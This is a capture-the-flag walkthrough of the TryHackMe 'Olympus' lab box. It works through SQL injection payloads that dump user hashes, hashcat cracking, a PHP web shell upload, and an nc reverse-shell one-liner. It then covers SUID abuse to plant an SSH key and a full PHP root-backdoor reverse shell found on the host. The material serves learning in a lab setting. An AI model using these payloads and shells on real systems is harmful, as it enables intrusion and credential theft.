# THM-Olympus - Maxwell Caron
 ---

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/b83a363b-1c4d-4fe7-b029-94c9d17e105c" width="450" /></p>

## NMAP

Initial `nmap` scan
```bash
$ nmap -sC -sV -oA scans/initial -vv 10.10.66.178

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
[...]
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://olympus.thm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From our `nmap` scan we can see two services running on the host `22` (SSH) and `80` (HTTP)

<br><br>

## HTTP

Using `feroxbuster` we can brute force directories on the web server.
```bash
feroxbuster -k -e -u http://olympus.thm/ -w /opt/directory-brute.txt -x php,html,txt,bak

[...]
301      GET        9l       28w      315c http://olympus.thm/~webmaster => http://olympus.thm/~webmaster/
[...]
```

<br><br>

### ~webmaster
<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/682a574d-e04f-4f8b-ad0f-8a84bb37b092" width="750" /></p>

We are greeted by a CMS with some blog posts

Looking around, there is a search and a login field

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/f7672100-0e68-43ae-b017-2b249e72ea36" width="750" /></p>

Testing for SQL injection in the search field by submitting a `'` (single quote) in the text box, we get a MySQL error as a response.

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/52fef8cd-17d6-44af-b83f-b9c5efb75451" width="750" /></p>

Opening burp and turning our proxy on we can capture this request

<br><br>

### SQL Injection

Find out which columns are text and where they are located
```
search=x' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10-- -&submit=
```

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/f4c1eb9c-64d7-4618-9db4-e8de7d161903" width="750" /></p>

- We will be using the 4th column

<br>

Retrieve database names:
```
search=x' UNION ALL SELECT 1,2,3,concat(schema_name),5,6,7,8,9,10 FROM information_schema.schemata-- -&submit=
```
- Found `olympus` database

<br>

Retrieve table names:
```
search=x' UNION ALL SELECT 1,2,3,concat(table_name),5,6,7,8,9,10 FROM information_schema.TABLES WHERE table_schema='olympus'-- -&submit=
```
- Found `users` table

<br>

Retrieve column names:
```
search=x' UNION ALL SELECT 1,2,3,concat(column_name),5,6,7,8,9,10 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'-- -&submit=
```
- Found `user_name`, `user_password`, and `randsalt`  columns

<br>

Retrieve data:
```
search=x' UNION ALL SELECT 1,2,3,concat(user_name, ':', user_password, ' salt: ', randsalt),5,6,7,8,9,10 FROM users-- -&submit=
```

Username | Password | Salt
------------ | ------------ | ------------
prometheus | `$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C` |
root | `$2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK` | dgas
zeus | `$2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC` | dgas

<br>

From the `randsalt` column, we see that only two of the three passwords have a salt, this should be the easiest one to crack.

Just from the looks of it, the passwords seem to be encrypted with `bcrypt` or mode `3200` in `hashcat`

```
C:\Hashcat\hashcat-6.2.5>hashcat --username -m 3200 ..\olympus_hashes.txt ..\rockyou.txt
hashcat (v6.2.5) starting

[...]

$2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C:summertime
```

We quickly find that `prometheus`' password is: `summertime`

We can now login as `prometheus`

<br><br>

### CMS Admin Page

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/07d57b53-de95-44c9-a042-4f4d46f84210" width="750" /></p>

Looking around the users tab, we see an interesting subdomain

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/97af950e-a8f3-4190-a49c-a0fedabae8dd" width="750" /></p>

Adding this to our `/etc/hosts` file and navigating to `http://chat.olympus.thm/` we see a new login page

<br><br>

### Olympus Chat

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/c125eaeb-7899-4970-b1f9-8cc7c7e36ba9" width="750" /></p>

Checking for password re-use, we get a successful logon as `prometheus:summertime`

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/08b71266-2a47-4e71-9268-cf9033acf0e1" width="750" /></p>

Reading the chats, we see that they are talking about the file upload functionality and how it renames the file randomly.

Knowing that these files and chats have to be stored somewhere, we can look back to our [[80 HTTP#SQL Injection|SQL injection]] and see if we find anoy other interesting databases, tables, or colums.

<br><br>

### File Upload

```
search=x' UNION ALL SELECT 1,2,3,concat(table_name),5,6,7,8,9,10 FROM information_schema.TABLES WHERE table_schema='olympus'-- -&submit=
```

Taking a second look at the tables inside of the `olympus` database we see a `chats` table

To retreive the columns of the `chats` table we can use the following command

```
search=x' UNION ALL SELECT 1,2,3,concat(column_name),5,6,7,8,9,10 FROM information_schema.COLUMNS WHERE table_name='chats'-- -&submit=
```

The two columns that we will be dumping are: `msg` & `file`

```
search=x' UNION ALL SELECT 1,2,3,concat(msg, ':', file),5,6,7,8,9,10 FROM chats-- -&submit=
```

From the data that we dumped we can see the new name of the `prometheus_password.txt` fle: `47c3210d51761686f3af40a875eeaaea.txt`

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/6d9c85e7-f758-4f40-b7c7-c6ff9c9aa00f" width="750" /></p>

Knowing that we can find the real name of the file that we upload, assuming there are no content filters, we should be able to get a shell

```bash
$ cat phprce.php
<?php
    echo system($_REQUEST["cmd"]);
?>
```

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/3b237540-b445-4ad6-8364-03ba84701409" /></p>

We see that the upload goes through, now we need to do the SQL injection once again to dump the `msg` & `file` columns.

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/f7641bd1-e0eb-48f5-8682-e2d97d395636" width="750" /></p>

Our new file is `fa8e5ef46fad7138483709a5f1cc8113.php`

Now we can find the file by navigating to `http://chat.olympus.thm/uploads/fa8e5ef46fad7138483709a5f1cc8113.php?cmd=id`

I will be capturing this request with burp's repeater and changing the request type to `POST`, this makes the commands easier to input and read personally.

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/a2357130-e4ef-4f8b-ac16-8538ce96b41d" width="750" /></p>

We now have command execution and can get a reverse shell

```
cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.13.5.204+9001+>/tmp/f
```

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/bf55c3ac-a474-497d-b4ad-0b89c4320a96" /></p>

<br><br>

## Internal

### www-data

Running `linpeas.sh` we see an interesting SUID binary meaning that we can execute it with the same permissions as the `zeus` user

```
-rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils (Unknown SUID binary)
```

Running the program we see that it is asking for a source and a destination file. With this information and the "CP" being capitalized in the ASCII art, we can assume this is some sort of file copy command.

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/ba950367-cffb-4b8a-af5e-43f265280940" /></p>

We can prove this by trying to copy the `user.flag` file to `flag.txt` in the same directory

Knowing that we can copy any file that `zeus` has access to, we can try to find a file that can help us escalate our privilages.

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/b77f9e3a-6ce3-4b82-8703-9dd3d7e38fc5" /></p>

Looking through `zeus`' home directory we can see that there is a `.ssh` directory, let's make our own key pair and copy it to `/home/zeus/.ssh/authorized_keys`

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/016c2c5e-c988-4c5e-8b67-c670c53fdff0" width="750" /></p>

Now we can upload the `id_rsa.pub` file over to the victim machine using a python3 server and copy it over using the `cputils` binary

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/7967c392-fdfd-47bf-a32b-e3081b6fc59e" width="750" /></p>

Even though we get an error message, we still get a successful login with our private key

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/3fd21a3d-6929-49c0-aade-2d937a2190a5" width="750" /></p>

<br><br>

### zeus

After running `linpeas.sh` once again and nothing notable coming up, I decided to look back into the `/var/www/` directory where the web pages are located

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/c7639552-2435-4843-b577-f5bfeb4ba5f3" /></p>

We see the two vhosts but we also see a normal `html` directory

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/9acf7da1-48b3-436e-a6c7-6eb2b691bc7a" /></p>

We find an interesting directory inside

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/df59fb09-9269-4f9a-96b0-f13c298a20cc" /></p>

Going deeper, we have another strangely-named `php` file

```php
<?php
$pass = "a7c5ffcf139742f52a5267c4a0674129";
if(!isset($_POST["password"]) || $_POST["password"] != $pass) die('<form name="auth" method="POST">Password: <input type="password" name="password" /></form>');

set_time_limit(0);

$host = htmlspecialchars("$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]", ENT_QUOTES, "UTF-8");
if(!isset($_GET["ip"]) || !isset($_GET["port"])) die("<h2><i>snodew reverse root shell backdoor</i></h2><h3>Usage:</h3>Locally: nc -vlp [port]</br>Remote: $host?ip=[destination of listener]&port=[listening port]");
$ip = $_GET["ip"]; $port = $_GET["port"];

$write_a = null;
$error_a = null;

$suid_bd = "/lib/defended/libc.so.99";
$shell = "uname -a; w; $suid_bd";

chdir("/"); umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if(!$sock) die("couldn't open socket");

$fdspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$proc = proc_open($shell, $fdspec, $pipes);

if(!is_resource($proc)) die();

for($x=0;$x<=2;$x++) stream_set_blocking($pipes[x], 0);
stream_set_blocking($sock, 0);

while(1)
{
    if(feof($sock) || feof($pipes[1])) break;
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if(in_array($sock, $read_a)) { $i = fread($sock, 1400); fwrite($pipes[0], $i); }
    if(in_array($pipes[1], $read_a)) { $i = fread($pipes[1], 1400); fwrite($sock, $i); }
    if(in_array($pipes[2], $read_a)) { $i = fread($pipes[2], 1400); fwrite($sock, $i); }
}

fclose($sock);
for($x=0;$x<=2;$x++) fclose($pipes[x]);
proc_close($proc);
?>
```

Inside of the file we can see some very interesting details of what seems to be a root backdoor

Let's visit this file with our browser by going to: `http://10.10.181.184/0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php`

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/9d7080aa-f968-4ce6-b6dd-7f41938254a6" width="750" /></p>

From the source code we know the password is: `a7c5ffcf139742f52a5267c4a0674129`

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/a9a910e0-5bc4-4d19-b812-93ce4432801d" width="750" /></p>

We are greeted with a simple page with instructions on how to connect to the backdoor

We will be using the "Remote" option

By setting up a new `netcat` listener and replacing the ip and port placeholders in the url and navigating to it, we are now `root`

<br><br>

### root

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/85c5fe34-a9ad-4201-8427-a1d32cc59264" width="750" /></p>

Our last task is to find the bonus flag

Since the flags have been using a pretty standard format of `flag{x}` we can use the `grep` tool to search every file for that same pattern

```
root@olympus:~# grep -r "flag{.*}" / 2>/dev/null
```

<p align="center"><img src="https://github.com/MaxwellCaron/writeups/assets/69171981/13db1fbd-5616-4b07-8301-4fa84451b75b" width="750" /></p>
